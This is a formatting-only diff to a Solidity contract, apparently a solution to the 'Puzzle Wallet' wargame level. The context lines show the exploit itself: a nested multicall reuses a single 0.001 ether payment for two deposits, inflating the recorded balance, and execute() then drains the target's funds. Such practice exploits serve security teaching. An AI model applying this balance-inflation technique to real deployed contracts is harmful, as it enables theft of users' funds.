@@ -12,11 +12,7 @@ interface IPuzzleWallet {
 
     function deposit() external payable;
 
-    function execute(
-        address to,
-        uint256 value,
-        bytes calldata data
-    ) external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
 
     function multicall(bytes[] calldata data) external payable;
 
@@ -46,9 +42,7 @@ contract PuzzleWalletAttack {
 
     /// @dev multicall을 통해 [deposit, multicall[deposit]]을 수행하면 최초 multicall을 통해 0.001 ether이 전달된 상태에서 2번의 deposit을 수행할 수 있다.
     function _balanceToZero() internal {
-        bytes memory argsDeposit = abi.encodeWithSelector(
-            IPuzzleWallet.deposit.selector
-        );
+        bytes memory argsDeposit = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
 
         _dataMulticall.push(argsDeposit);
 
@@ -64,13 +58,9 @@ contract PuzzleWalletAttack {
             _dataMulticall // deposit, multicall[deposit]
         );
 
-        (bool res, ) = _target.call{value: 0.001 ether}(mainArgsMulticall);
+        (bool res,) = _target.call{value: 0.001 ether}(mainArgsMulticall);
 
-        require(
-            res &&
-                IPuzzleWallet(_target).balances(address(this)) >=
-                _target.balance
-        );
+        require(res && IPuzzleWallet(_target).balances(address(this)) >= _target.balance);
 
         IPuzzleWallet(_target).execute(_owner, _target.balance, "");
     }
